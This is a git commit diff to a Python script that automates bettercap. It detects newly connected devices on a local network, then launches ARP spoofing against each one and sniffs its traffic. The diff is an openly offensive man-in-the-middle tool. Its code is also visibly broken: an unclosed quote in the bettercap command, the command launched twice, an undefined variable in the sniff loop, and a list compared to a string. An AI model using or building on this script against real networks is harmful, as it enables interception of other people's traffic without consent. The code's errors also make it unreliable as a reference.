213e8ea5a8f030736a029d60cea32fa7ac75eda1
Kylie Angel <77999097+kyliea5728@users.noreply.github.com>
2024-05-23 18:31:54 -0400

    Add files via upload

--- bettercap.py
+++ bettercap.py
@@ -24,9 +24,12 @@ def run_bettercap():
             output = process.stdout.readline() #read one line from the output of the subprocess 
             if output == '' and process.poll() is not None: #if there is an empty string and if the subprocess returns a value other than None, indicating the subprocess has terminated
                 break
-            if output: #checks if output has any data
+            if output and not found_ip_flag: #checks if output has any data
                 print(output.strip()) #prints the output after removing any trailing whitespace
-                extract_info(output) #parses and extracts useful information
+                ip = extract_info(output) #parses and extracts useful information
+            if found_ip_flag:
+                arp_spoofing(ip)
+                
    
     except Exception as e:
         print(f"Error with running Bettercap {e}")
@@ -37,21 +40,47 @@ def run_bettercap():
             
 def extract_info(output):
     
-    global device_ip
+    global device_ip, found_ip_flag
     
     if "endpoint.new" in output: #endpoint.new is an event that happens when a new device connects to the network/becomes active
         ip_pattern = r'[0-9]+(?:\.[0-9]+){3}'
         found_ip = re.findall(ip_pattern, output)
         
-        if found_ip and found_ip not device_ip:
-            print(f"IP found {found_ip[0]}")
-            arp_spoofing(found_ip)
+        if found_ip and found_ip != device_ip:
+            print(f"IP found {found_ip}")
+            found_ip_flag = True
+            return found_ip
+        
     
 def arp_spoofing(target_ip):
     
+    global interface
+    
+    arp_interface = f"set arp.spoof.interface {interface}"
+    set_arp_target =f"set arp.spoof.targets {target_ip}"
+    turn_arp_on = f"arp.spoof on"
+    start_sniffing = f"net.sniff on"
+    
+    update_command = f"sudo bettercap -eval '{arp_interface}; {set_arp_target}; {turn_arp_on}; {start_sniffing}"
+    
+    process = subprocess.Popen(update_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    
+    try:
+        subprocess.run(update_command, shell=True)
+        print(f"ARP Spoofing is set for {target_ip}")
+        
+        while True:
+            sniffed_output = process.stdout.readline()
+            
+            if sniffed_output:
+                print(output.strip())
+            
+    except Exception as e:
+        print(f"Error setting ARP Spoofing: {e}")
 
 #--------------------------
 device_ip = '169.254.62.118'
 interface = 'eth0'
+found_ip_flag = False
 run_bettercap()
         
